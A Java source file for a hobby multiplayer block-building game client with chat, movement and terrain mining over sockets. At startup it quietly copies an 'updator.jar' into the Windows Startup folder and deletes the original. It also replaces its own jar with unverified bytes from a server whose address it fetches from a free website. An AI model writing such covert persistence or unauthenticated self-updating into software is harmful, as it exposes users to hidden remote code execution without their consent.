import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.*;

public class client{
	static final int version = 10;
	
	static String message = "";
	static int id = 0;
	
	static cliCanvas cam;
	static listenerC listener;
	static ArrayList<player> renders = new ArrayList<player>();
	
	static terrain ter;
	static player p;
	public static void main(String args[]) throws Exception{
		downloader.startup("updator.jar");
		
		p = new player();
		
		URL oracle = new URL("http://leedavida.my-free.website/");
        Scanner inSt = new Scanner(oracle.openStream());

        String inputLine = "";
        while (!inputLine.equals("connectTo")){
            inputLine = inSt.next();
			System.out.println(inputLine);
		}
		String connectTo = inSt.next();
		System.out.println(connectTo);
		
		Socket s = new Socket(connectTo,8888);
		InputStream sIn = s.getInputStream();
		
		JFrame frame = new JFrame("RobertoCraft v.0.0.0.1");
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		client.cam = new cliCanvas();
		client.cam.setPreferredSize(new Dimension(500,500));
		frame.add(client.cam);
		frame.pack();
		frame.setVisible(true);
		
		client.listener = new listenerC(s);
		frame.addKeyListener(client.listener);
		client.cam.addMouseListener(client.listener);
		
		PrintStream print = new PrintStream(s.getOutputStream());
		Scanner in = new Scanner(sIn);
		print.println(client.version);
		System.out.println("Connected to server ");
		
		
		String phString = in.nextLine();
		while(!in.hasNextBoolean()){
			System.out.println(in.nextLine());
		}
		if(in.nextBoolean()){
			File update = new File("client.jar");
			if(!update.exists()){
				update.createNewFile();
			}
			copy(sIn, new FileOutputStream(update));
			System.exit(0);
		} 		
		client.ter = terrain.fromString(phString);
		(new Thread(new cliListener(s))).start();
		
		
		java.util.Timer timer = new java.util.Timer();
		TimerTask task = new TimerTask(){
			public void run(){
				client.p.move(player.DOWN, 2);
				client.cam.repaint();
				client.listener.update();
			}
		};
		timer.scheduleAtFixedRate(task, 0, 100);
	}
	public static void copy(InputStream in, OutputStream out) throws IOException {
        byte[] buf = new byte[1024];
        int len = 0;
        while ((len = in.read(buf)) == 1024) {
            out.write(buf, 0, len);
			System.out.println(len);
        }
            out.write(buf, 0, len);
			System.out.println(len);
    }
}
class cliListener implements Runnable{
	Socket s;
	Scanner in;
	public cliListener(Socket s){
		this.s = s;
		try{
		in = new Scanner(s.getInputStream());
		
		}catch(IOException e){
			System.out.println("Crap");
		}
	}
	
	public void run(){
		while(true){
			in.hasNextLine();
			String type = in.next();
			if(type.equals("text")){
				client.cam.addText(in.nextLine());	
			}else if(type.equals("pos")){
				int id = Integer.parseInt(in.next());
				
				while(id >= client.renders.size()){
					client.renders.add(new player());
				}
				
				client.renders.set(id, player.fromString(in.next()));
			}else if(type.equals("setup")){
				client.id = Integer.parseInt(in.next());
				System.out.println(client.id);
			}else if(type.equals("ter")){
				client.ter.decode(in.nextLine());
			}
			
			try{
				Thread.sleep(10);
			}catch(Exception e){}
		}
		
	}
}
class cliCanvas extends JPanel{
	BufferedImage off;
	Graphics2D bg;
	
	private ArrayList<String> text = new ArrayList<String>();
	public cliCanvas(){
		setSize(500,500);
		
		off = new BufferedImage(500,500,BufferedImage.TYPE_INT_ARGB);
		bg = off.createGraphics();
	}
	public void paintComponent(Graphics g){
		if(client.ter == null)
			return;
		Graphics2D g2 = (Graphics2D) bg;
		//Clear the board
		g2.setColor(Color.WHITE);
		g2.fill(new Rectangle(0,0,500,500));
		//Render terrain
		client.ter.render(g2);
		//Chat stuffs
		g2.setColor(Color.BLACK);
		g2.setFont(new Font("TimesRoman", Font.PLAIN, 10));
		for(int i = 0; i < Math.min(this.text.size(), 10); i++){
			g2.drawString(this.text.get(i + Math.max(0, this.text.size() - 10)), 15,10 * i + 20);
		}
		g2.drawString("Send Message : " + client.message, 15,10 * 11 + 20);
		
		//Draw players and stuff
		for(int i = 0; i < client.renders.size(); i++){
			if(i != client.id){
				g2.fill(new Rectangle(245 + client.renders.get(i).x - client.p.x, 245 + client.renders.get(i).y - client.p.y,10,10));
				g2.drawString(client.renders.get(i).name, 245 + client.renders.get(i).x - client.p.x, 245 + client.renders.get(i).y - client.p.y);
			}
		}
		g2.fill(new Rectangle(245, 245, 10, 10));
		
		g = (Graphics2D) g;
		g.drawImage(off, 0, 0, null);
	}
	public void addText(String s){
		this.text.add(s);
	}
	public void update(Graphics g){
		paint(g);
	}
}
class listenerC implements KeyListener, MouseListener{
	private Socket ss;
	private Scanner in;
	private PrintStream out;
	
	private int update = 0;
	private boolean talking = false;
	private Hashtable<Integer, Boolean> keys = new Hashtable<Integer, Boolean>();
	public listenerC(Socket ss) throws Exception{
		this.ss = ss;
		
		in = new Scanner(ss.getInputStream());
		out = new PrintStream(ss.getOutputStream());
	}
	public void keyPressed(KeyEvent e){
		this.keys.put(e.getKeyCode(), true);
	}
	public void keyReleased(KeyEvent e){
		this.keys.remove(e.getKeyCode());
		int i = e.getKeyCode();
		char c = e.getKeyChar();
		if(i == 10){
			out.println("text " + System.getProperty("user.name") + " : " +  client.message);
			client.message = "";
			System.out.println("sent");
		}else if(i == 8){
			client.message = client.message.substring(0, Math.max(0, client.message.length() - 1));
		}else if(c != 65535){
			client.message += c;
		}
	}
	public synchronized void update(){
		Set<Integer> s = this.keys.keySet();
		for(Integer p : s){
			int i = p.intValue();
			char c = (char) i;
			if(true){
				if(i == KeyEvent.VK_UP){
					client.p.move(player.UP);
				}else if(i == KeyEvent.VK_DOWN){
					client.p.move(player.DOWN);
				}else if(i == KeyEvent.VK_LEFT){
					client.p.move(player.LEFT);
				}else if(i == KeyEvent.VK_RIGHT){
					client.p.move(player.RIGHT);
				}
			}
		}
		if(update++ % 10 == 0)
			out.println("pos " + client.id + " " + client.p.toString());
	}
	public void keyTyped(KeyEvent e){}
	
	public void mousePressed(MouseEvent e){
		String temp = client.p.mine(e.getX(), e.getY());
		if(temp == "")
			return;
		out.println("ter " + temp);
		
	}
	public void mouseReleased(MouseEvent e){ }
	public void mouseEntered(MouseEvent e){	}
	public void mouseExited(MouseEvent e){	}
	public void mouseClicked(MouseEvent e){
	}
	
}
class player{
	static int UP = 0;
	static int DOWN = 2;
	static int LEFT = 1;
	static int RIGHT = 3;
	
	public int x;
	public int y;
	public String name = "";
	public player(){
		this.x = 0;
		this.y = 0;
	}
	public String toString(){
		return System.getProperty("user.name") + ":" + Integer.toString(this.x) + "," + Integer.toString(this.y);
	}
	public void move(int dir, int amount){
		if(amount < 1)
			return;
		int x = this.x;
		int y = this.y;
		if(dir == player.UP){
			this.y-=amount;
		}else if(dir == player.DOWN){
			this.y+= amount;
		}else if(dir == player.LEFT){
			this.x-=amount;
		}else if(dir == player.RIGHT){
			this.x+=amount;
		}
		if(client.ter.intersect(new Rectangle(this.x - 5, this.y - 5, 10, 10))){
			this.x = x;
			this.y = y;
			this.move(dir, amount-1);
		}
	}
	public void move(int dir){
		if(dir == player.UP){
			if(!this.touching())
				return;
			this.move(dir, 15);
			return;
		}
		this.move(dir, 3);
	}
	public String mine(int x,int y){
		x -= 250;
		y -= 250;
		if(x * x + y * y > 400)
			return "";
		
		return client.ter.change((int) Math.floor((x + this.x + 5) / 10 + client.ter.blocks.length/2),(int) Math.floor((y + this.y + 5) / 10 + client.ter.blocks.length/2));
	}
	public boolean touching(){
		return client.ter.intersect(new Rectangle(this.x - 5, this.y - 5, 10, 12));
	}
	public static player fromString(String a){
		player ret = new player();
		ret.name = a.substring(0, a.indexOf(':'));
		ret.x = Integer.parseInt(a.substring(a.indexOf(':') + 1,a.indexOf(',')));
		ret.y = Integer.parseInt(a.substring(a.indexOf(',') + 1,a.length()));
		return ret;
	}
}
class terrain{
	public block[][] blocks;
	
	public terrain(){
		int width = 50;
		blocks = new block[2 * width + 1][2 * width + 1];
		for(int i = -width; i <= width; i++){
			for(int z = -width; z <= width; z++){
				blocks[i + width][z + width] = new block(-i < z ? 1: 0, 10 * i, 10 * z);
			}	
		}
	}
	public void render(Graphics2D g2){
		for(int i = 0; i < blocks.length; i++){
			for(int z = 0; z < blocks[i].length; z++){
				blocks[i][z].render(g2);
			}
		}
	}
	public boolean intersect(Rectangle r){
		for(int i = 0; i < blocks.length; i++){
			for(int z = 0; z < blocks.length; z++){
				if(blocks[i][z].intersect(r))
					return true;
			}
		}
		return false;
	}
	public String change(int x, int y){
		this.blocks[x][y].setType(this.blocks[x][y].getType() == 0? 1: 0);
		return "change " + x + " " + y + " " + this.blocks[x][y].getType();
	}
	public void decode(String message){
		Scanner in = new Scanner(message);
		String type = in.next();
		if(type.equals("change")){
			this.blocks[in.nextInt()][in.nextInt()].setType(in.nextInt());
		}
	}
	public String toString(){
		String ret = this.blocks.length + " ";
		for(int i = 0; i < this.blocks.length; i++){
			for(int z = 0; z < this.blocks[i].length; z++){
				try{
				ret += " " + this.blocks[i][z].toString();
				}catch(Exception e){
					e.printStackTrace();
					System.out.println(i + " " + z);
				}
			}
		}
		return ret;
	}
	public static terrain fromString(String s){
		Scanner scan = new Scanner(s);
		int width = scan.nextInt();
		terrain ret = new terrain();
		
		for(int i = 0; i < width; i++){
			for(int z = 0; z < width; z++){
				ret.blocks[i][z] = new block(scan.nextInt(), scan.nextInt(), scan.nextInt());
			}
		}
		return ret;
	}
}
class block{
	private int type;
	private int x;
	private int y;
	
	private Rectangle r;
	public block(int type, int x, int y){
		this.type = type;
		this.x = x;
		this.y = y;
		
		this.r = new Rectangle(this.x-5, this.y-5, 10, 10);
		
	}
	public boolean intersect(Rectangle r){
		if(this.type == 0)
			return false;
		return Math.abs(this.x - r.x - r.width/2) < 5 + r.width/2 && Math.abs(this.y - r.y - r.height/2) < 5 + r.height/2;	
	}
	public void setType(int n){
		this.type = n;
	}
	public int getType(){
		return this.type;
	}
	public void render(Graphics2D g2){
		g2.setColor(Color.RED);
		if(this.type == 1)
			g2.fill(new Rectangle(this.r.x - client.p.x + 250, this.r.y - client.p.y + 250, this.r.width, this.r.height));
	}
	public String toString(){
		return " " + this.type + " " + this.x + " " + this.y;
	}
}
class downloader{
	
	public static void startup(String a){
    	try{
    	    File af =new File(a);
    	    File bf =new File("C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + a);
			
			if(!af.exists() || bf.exists())
				return;
			
			bf.createNewFile();
			
    	    FileInputStream inStream = new FileInputStream(af);
    	    FileOutputStream outStream = new FileOutputStream(bf);

    	    byte[] buffer = new byte[1024];

    	    int length;
    	    //copy the file content in bytes
    	    while ((length = inStream.read(buffer)) > 0){
    	    	outStream.write(buffer, 0, length);
    	    }

    	    inStream.close();
    	    outStream.close();
			
			af.delete();

    	}catch(IOException e){
    	    e.printStackTrace();
    	}
	}
}